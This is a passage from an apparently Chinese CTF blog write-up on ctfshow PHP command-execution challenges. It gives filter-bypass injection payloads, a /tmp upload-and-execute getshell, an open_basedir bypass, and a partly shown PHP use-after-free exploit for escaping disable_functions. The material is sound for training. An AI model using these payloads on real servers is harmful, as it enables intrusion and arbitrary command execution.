<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>ctfshow-命令执行篇</title>
      <link href="/2023/06/30/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87/"/>
      <url>/2023/06/30/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>web29：正常命令执行，过滤了flag，使用通配符*绕过</p><p>web30：多了system和php，用于替代system的函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>()</span><br><span class="line"><span class="title function_ invoke__">passthru</span>()</span><br><span class="line"><span class="title function_ invoke__">exec</span>()</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>()</span><br><span class="line"><span class="title function_ invoke__">popen</span>()</span><br><span class="line"><span class="title function_ invoke__">proc_open</span>()</span><br><span class="line"><span class="title function_ invoke__">pcntl_exec</span>()</span><br><span class="line">反引号 同<span class="title function_ invoke__">shell_exec</span>() 注意除了system，其他都无回显，需要<span class="keyword">echo</span></span><br></pre></td></tr></table></figure><p>payload：c&#x3D;echo exec(‘nl fla?????’);</p><p>web31：多了cat \  sort，空格也被过滤。</p><p>cat被过滤，用于替代cat的函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">more:下一页</span><br><span class="line">less:与 more 类似 head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是</span><br><span class="line">cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看 file -f:报错出具体内容 grep</span><br><span class="line">1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">c=eval($_GET[1]);&amp;1=system(&#x27;nl flag.php&#x27;);传马</span><br><span class="line">c=highlight_file(next(array_reverse(scandir(dirname(__FILE__)))));</span><br><span class="line">c=show_source(next(array_reverse(scandir(pos(localeconv())))));函数嵌套</span><br><span class="line">c=echo(`nl%09fl[abc]*`);</span><br><span class="line">c=&quot;\x73\x79\x73\x74\x65\x6d&quot;(&quot;nl%09fl[a]*&quot;);十六进制等价于system()</span><br><span class="line">c=echo`strings%09f*`;反引号</span><br><span class="line">c=echo`strings\$IFS\$9f*`必须加转义字符</span><br></pre></td></tr></table></figure><p>web32：过滤了括号，小知识：include不用括号，分号可以用?&gt;代替。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-</span></span><br><span class="line">encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>web33-36：全部用include+data即可</p><p>web37：文件包含过滤了flag，通配符f*绕过</p><p>web38：过滤了php，file等，使用data:&#x2F;&#x2F;text&#x2F;plain;base64,要执行命令的base64</p><p>web39：同上，相当于执行了php语句&lt;?php system(‘cat f*’)?&gt;.php</p><p>web40：无参rce，详见下面。</p><p>web41：无字母数字rce，详见下面，使用|,+,~来构造出需要的字符，有脚本可以直接用。</p><p>web42：&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1的意思就是不进行回显，将输出重定向至黑洞。</p><p>那要让命令回显怎么办呢，进行命令分隔即可</p><p>; &#x2F;&#x2F;分号<br> | &#x2F;&#x2F;只执行后面那条命令<br> || &#x2F;&#x2F;只执行前面那条命令<br> &amp; &#x2F;&#x2F;两条命令都会执行<br> &amp;&amp; &#x2F;&#x2F;两条命令都会执行</p><p>也就是使用||就可以把后面的短路，只执行前面的命令，构造payload  cat flag.php||即可。<br>web43：过滤了cat，换tac同上</p><p>web44：过滤了flag.，*或？通配符绕过</p><p>web45：过滤了空格，用$IFS$</p><p>web46：过滤了$,使用%09</p><p>web47：同上</p><p>web48：同上</p><p>web49：同上</p><p>web50：%09被过滤，使用&lt;&gt;代替空格，但需要注意&lt;&gt;和？同时使用不会回显，所以需要用\来代替？。</p><p>web51：${IFS}代替空格</p><p>web52：同上</p><p>web53：同上</p><p>web54：把常用的查看文件的命令全部过滤了，而且使用*通配符来正则表达，使得无法使用\绕过，这时候我们采用一个新的命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grep pattern file</span><br><span class="line">在文件file中搜索包含pattern的所有行，并将这些行打印出来</span><br><span class="line">payload： grep$&#123;IFS&#125;&#x27;&#123;&#x27;$&#123;IFS&#125;fl????hp</span><br></pre></td></tr></table></figure><p>web55：只过滤了字母没有过滤数字，这里可以采用一种新的方式来查看flag.php</p><p>可以使用？通配符来匹配到&#x2F;bin目录下的命令，&#x2F;bin目录下放着一些基本的命令，通过绝对路径来使用他们和直接用名字使用是完全一样的。</p><p>&#x2F;bin&#x2F;base64 flag.php即可查看到flag，则使用&#x2F;???&#x2F;????64 ????.???查看flag</p><p>web56：<strong>无字母无数字无$getshell高级（临时文件利用）</strong></p><p>php特性，上传文件后会放在&#x2F;tmp的临时目录，如果使用<strong>“.”</strong>来执行我们自己上传的脚本即可实现getshell。</p><p>注意我们上传的文件会被重命名，默认的文件名是phpXXXXXX，后六位是随机的大小写字母，但是文件名中也有字母，无法直接输入文件名，只能使用通配符来执行文件，而通配符匹配出来的文件可能有多个，可以利用有可能有大写字母的特性来限定文件，????????[@-[]（由ascii值来将最后一位限定为大写，试几次就行）</p><p>由于原来题目的页面并没有提供文件上传的功能，所以我们可以自己写一个html来进行文件上传。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://77476791-58c4-46d2-99e0-5b89c8de5cab.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上传1.txt，点提交抓到提交的包，参数输入.%20&#x2F;???&#x2F;????????[@-[]来执行脚本，脚本内容里写上自己想要执行的linux命令即可。</p><p class='item-img' data-src='https://s2.loli.net/2023/05/16/PitVNhY6Xn2cGAp.png'><img src="https://s2.loli.net/2023/05/16/PitVNhY6Xn2cGAp.png" alt="image-20230516213556356"></p><p>web57：什么都没有只靠$和括号构造数字</p><p>双小括号 (( )) 是 Bash Shell 中专门用来进行整数运算的命令，它的效率很高，写法灵活，是企业运维中常用的运算命令。 通俗地讲，就是将数学运算表达式放在((和))之间。 表达式可以只有一个，也可以有多个，多个表达式之间以逗号,分隔。对于多个表达式的情况，以最后一个表达式的值作为整个 (( ))命令的执行结果。 可以使用$获取 (( )) 命令的结果，这和使用$获得变量值是类似的。 可以在 (( )) 前面加上$符号获取 (( )) 命令的执行结果，也即获取整个表达式的值。以 c&#x3D;$((a+b)) 为例，即将 a+b 这个表达式的运算结果赋值给变量 c。 注意，类似 c&#x3D;((a+b)) 这样的写法是错误的，不加$就不能取得表达式的结果。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$(( $((~$(()))) $((~$(()))) ))</span><br><span class="line">$((~$(())))==-1 中间有两个所以是-2 是相加的 那中间有36个就是-36，最后再统一取反可获得题目要求构造的36</span><br></pre></td></tr></table></figure><p>web58-65：禁用函数代码突破，使用多种不同的方式扫描目录，读取文件</p><p>show_source();</p><p>highlight_file();</p><p>file_get_contents();</p><p>include()  +    get_defined_vars();</p><p>include();&#x2F;&#x2F;直接包含文件，或者利用php伪协议来读取文件</p><p>web66-70：</p><p>多种输出函数：</p><p>echo</p><p>print_r()</p><p>var_dump()</p><p>var_export();</p><p>web71:</p><p>将缓冲区预备输出的内容进行了替换输出，而将原来本要输出的内容清空</p><p>为了避免这个替换操作，我们可以直接加多一行php代码，使得命令执行完直接结束php程序，加exit();或die();即可。</p><p>web72：尝试读取目录发现被open_basedir限制，使用glob伪协议来绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c=</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&quot;    &quot;</span> ;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">exit</span>(); 记得url编码再发送！！</span><br></pre></td></tr></table></figure><p>发现flag在flag0.txt中，尝试读取发现没有权限读取，此时使用一个开源脚本去读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="string">&quot;ls /;cat /flag0.txt&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>(); <span class="comment"># ;)</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123; <span class="comment"># PHP &gt;= 7.4</span></span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%c&#x27;</span>,<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%c&#x27;</span>,<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"> </span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span 